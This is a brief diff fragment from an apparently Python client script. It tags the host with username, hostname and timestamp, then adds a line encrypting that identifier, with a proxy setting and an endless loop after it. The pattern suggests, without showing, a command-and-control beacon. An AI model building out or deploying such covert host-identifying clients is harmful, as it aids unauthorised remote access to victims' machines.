@@ -25,7 +25,7 @@ if platform.system() == "Windows":
 else:
     # Linux environment
     client = getenv("USER", "Unknown_User") + "@" + uname().nodename + "_" + timestamp
-
+client = cipher.encrypt(client.encode()).decode() # encoder
 
 # PROXY = {"https": "proxy.some-site.com:443"}
 while True:
